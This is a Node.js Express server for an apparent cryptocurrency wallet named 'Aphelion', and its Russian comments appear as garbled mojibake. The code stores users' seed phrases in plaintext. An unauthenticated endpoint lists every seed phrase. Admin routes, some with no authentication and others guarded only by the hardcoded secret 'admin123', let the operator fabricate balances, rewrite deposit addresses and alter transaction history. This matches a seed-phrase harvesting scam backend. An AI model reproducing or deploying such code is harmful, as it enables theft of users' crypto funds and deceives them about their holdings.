const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');

const app = express();
const PORT = 3001;
const ADMIN_SECRET = 'admin123';

const db = new sqlite3.Database('./aphelion.db');

// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ CORS: —Ä–∞–∑—Ä–µ—à–∞–µ–º –∑–∞–ø—Ä–æ—Å—ã —Å —É–∫–∞–∑–∞–Ω–Ω—ã—Ö origin
const allowedOrigins = [
  'http://localhost:3001',
  'http://localhost:5173',
  'https://aphelionwallet.onrender.com',
  'https://aphelionwallet.info',
  'https://www.aphelionwallet.info',
];

app.use(cors({
  origin: allowedOrigins,
  methods: ['GET', 'POST'],
  credentials: true
}));
app.use(bodyParser.json());

// –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ (–ø—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–±–æ—Ç—ã —Å–µ—Ä–≤–µ—Ä–∞)
app.get('/', (req, res) => {
  res.send(`<h2>üöÄ Aphelion Server —Ä–∞–±–æ—Ç–∞–µ—Ç</h2><p>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /api/* –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å API</p>`);
});

// -------------------- –°–æ–∑–¥–∞–Ω–∏–µ —Ç–∞–±–ª–∏—Ü –≤ SQLite --------------------
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    mnemonic TEXT UNIQUE,
    receive_address TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    token TEXT,
    amount REAL,
    to_address TEXT,
    status TEXT,
    date TEXT
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS balances (
    user_id INTEGER,
    token TEXT,
    amount REAL,
    receive_address TEXT,
    PRIMARY KEY (user_id, token)
  )`);
});

// -------------------- API-—ç–Ω–¥–ø–æ–∏–Ω—Ç—ã --------------------

// –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
app.post('/api/register', (req, res) => {
  const { mnemonic } = req.body;
  if (!mnemonic) {
    return res.status(400).json({ error: '–ù–µ—Ç —Å–∏–¥-—Ñ—Ä–∞–∑—ã' });
  }
  db.run(`INSERT INTO users (mnemonic) VALUES (?)`, [mnemonic], function (err) {
    if (err) {
      return res.status(400).json({ error: '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –µ—Å—Ç—å' });
    }
    res.json({ id: this.lastID });
  });
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ —Å–∏–¥-—Ñ—Ä–∞–∑–µ
app.post('/api/get-user', (req, res) => {
  const { mnemonic } = req.body;
  db.get(`SELECT * FROM users WHERE mnemonic = ?`, [mnemonic], (err, user) => {
    if (err || !user) {
      return res.status(404).json({ error: '–ù–µ –Ω–∞–π–¥–µ–Ω' });
    }
    res.json(user);
  });
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
app.get('/api/users', (req, res) => {
  db.all(`SELECT id, mnemonic, receive_address FROM users ORDER BY id DESC`, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(rows);
  });
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
app.get('/api/balances/:user_id', (req, res) => {
  const { user_id } = req.params;
  db.all(
    `SELECT token, amount, receive_address FROM balances WHERE user_id = ?`,
    [user_id],
    (err, rows) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json(rows);
    }
  );
});

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ (–¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è)
app.post('/api/update-balance', (req, res) => {
  const { user_id, token, amount } = req.body;
  db.run(
    `INSERT INTO balances (user_id, token, amount)
     VALUES (?, ?, ?)
     ON CONFLICT(user_id, token) DO UPDATE SET amount = excluded.amount`,
    [user_id, token, amount],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ (–¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞)
app.post('/api/admin/update-balance', (req, res) => {
  const { user_id, token, amount, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: '–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞' });
  }
  db.run(
    `INSERT INTO balances (user_id, token, amount)
     VALUES (?, ?, ?)
     ON CONFLICT(user_id, token) DO UPDATE SET amount = excluded.amount`,
    [user_id, token, amount],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// –£–¥–∞–ª–µ–Ω–∏–µ –±–∞–ª–∞–Ω—Å–∞ (–¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞)
app.post('/api/admin/delete-balance', (req, res) => {
  const { user_id, token } = req.body;
  db.run(`DELETE FROM balances WHERE user_id = ? AND token = ?`, [user_id, token], function (err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json({ success: true });
  });
});

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ receiving address –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è (–≥–ª–æ–±–∞–ª—å–Ω–æ) ‚Äì –∞–¥–º–∏–Ω
app.post('/api/admin/update-receive-address', (req, res) => {
  const { user_id, receive_address, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: '–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞' });
  }
  db.run(
    `UPDATE users SET receive_address = ? WHERE id = ?`,
    [receive_address, user_id],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ receiving address –¥–ª—è –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –º–æ–Ω–µ—Ç—ã (–≤ —Ç–∞–±–ª–∏—Ü–µ balances) ‚Äì –∞–¥–º–∏–Ω
app.post('/api/admin/update-balance-address', (req, res) => {
  const { user_id, token, receive_address, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  db.run(
    `UPDATE balances SET receive_address = ? WHERE user_id = ? AND token = ?`,
    [receive_address, user_id, token],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// –ü–æ–ª—É—á–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
app.get('/api/transactions/:user_id', (req, res) => {
  const { user_id } = req.params;
  db.all(
    `SELECT * FROM transactions WHERE user_id = ? ORDER BY date DESC`,
    [user_id],
    (err, rows) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json(rows);
    }
  );
});

// –°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
app.post('/api/transaction', (req, res) => {
  const { user_id, token, amount, to_address, status, date: clientDate } = req.body;
  const date = clientDate || new Date().toISOString();
  db.run(
    `INSERT INTO transactions (user_id, token, amount, to_address, status, date)
     VALUES (?, ?, ?, ?, ?, ?)`,
    [user_id, token, amount, to_address, status, date],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true, id: this.lastID });
    }
  );
});

// –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
app.post('/api/admin/update-transaction', (req, res) => {
  const { id, token, amount, to_address, status, date, secret } = req.body;
  if (secret !== ADMIN_SECRET) {
    return res.status(403).json({ error: 'Unauthorized' });
  }
  db.run(
    `UPDATE transactions SET token = ?, amount = ?, to_address = ?, status = ?, date = ? WHERE id = ?`,
    [token, amount, to_address, status, date, id],
    function (err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ success: true });
    }
  );
});

// –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: —É–¥–∞–ª–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
app.post('/api/admin/delete-transaction', (req, res) => {
  const { id } = req.body;
  db.run(`DELETE FROM transactions WHERE id = ?`, [id], function (err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json({ success: true });
  });
});

// –ó–∞–ø—É—Å–∫ —Å–µ—Ä–≤–µ—Ä–∞
app.listen(PORT, () => {
  console.log(`‚úÖ –°–µ—Ä–≤–µ—Ä –∑–∞–ø—É—â–µ–Ω –Ω–∞ http://localhost:${PORT}`);
});
